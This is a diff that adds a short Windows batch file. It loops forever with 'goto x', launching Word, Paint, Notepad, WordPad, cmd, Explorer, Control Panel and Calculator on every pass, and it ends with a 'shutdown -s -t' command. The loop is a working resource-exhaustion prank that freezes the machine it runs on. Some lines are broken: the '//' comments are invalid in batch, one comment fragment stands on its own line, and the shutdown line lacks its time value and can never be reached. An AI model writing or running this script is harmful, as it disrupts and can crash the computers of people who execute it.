@@ -1,0 +1,14 @@
+@echo off // it instructs to hide the commands 
+when batch files is excecuted
+:x //loop variable
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+
+shutdown -s -t
